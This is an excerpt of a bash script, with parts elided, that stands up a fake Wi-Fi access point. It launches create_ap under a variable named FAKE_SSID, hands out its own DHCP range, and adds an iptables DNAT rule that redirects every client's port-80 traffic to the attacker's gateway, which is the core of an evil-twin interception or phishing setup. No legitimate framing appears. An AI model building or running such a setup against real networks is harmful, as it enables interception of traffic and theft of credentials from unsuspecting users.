...
echo "[*] Cleaning up any existing AP, dnsmasq, or tcpdump processes..."
...
echo "[*] Launching create_ap in background..."
create_ap --no-virt -n --gateway 10.10.0.1 --netmask 255.255.255.0 --dhcp-range 10.10.0.2,10.10.0.254 $WIFI_INTERFACE $FAKE_SSID > /tmp/create_ap.log 2>&1 &
sleep 8
echo "[+] create_ap launched. Output is being logged to /tmp/create_ap.log"
...
sudo iptables -t nat -A PREROUTING -i $WIFI_INTERFACE -p tcp --dport 80 -j DNAT --to-destination 10.10.0.1:80
...
echo "[+] Check AP output log with: tail -f /tmp/create_ap.log"
